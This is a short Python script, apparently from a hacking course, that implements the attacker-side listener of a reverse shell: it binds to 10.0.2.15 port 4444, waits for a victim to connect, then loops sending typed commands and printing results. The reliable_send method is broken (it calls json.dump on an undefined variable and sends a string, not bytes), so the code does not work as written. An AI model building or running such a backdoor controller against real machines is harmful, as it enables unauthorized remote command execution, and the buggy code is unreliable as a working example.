import socket, json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for connections ... ")
        self.connection, address = listener.accept()
        print(f"[+] Got a Connection from {address}")

    def reliable_send(self, data):
        json_data = json.dump(json_data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def execute_remotely(self, command):
        #self.connection.send(command.encode())
        #return self.connection.recv(1024).decode()

        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):  
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)



mylistener = Listener("10.0.2.15", 4444)
mylistener.run()